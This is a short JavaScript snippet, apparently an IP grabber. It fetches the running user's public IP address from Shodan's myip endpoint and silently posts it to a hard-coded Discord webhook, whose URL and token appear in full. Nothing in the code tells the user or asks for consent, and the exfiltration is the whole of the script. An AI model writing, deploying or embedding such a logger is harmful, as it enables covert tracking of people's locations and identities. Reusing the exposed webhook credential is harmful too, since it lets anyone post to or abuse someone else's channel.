const SHODAN_IP_API_URL = "https://api.shodan.io/tools/myip";
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1206919379397255201/UstaPTdGwX6MIJAWSWqaIwX45BiqNQr_PVspqxnlwJROmkkNTWo-aaAB8FYvZZzBhJaj";

// Fetch the user's IP
fetch(SHODAN_IP_API_URL)
  .then((response) => response.json())
  .then((data) => {
    const IP = data.ip;

    const payload = {
      content: `IP: ${IP}`,
    };

    // Send the IP to the Discord webhook
    fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });
  });
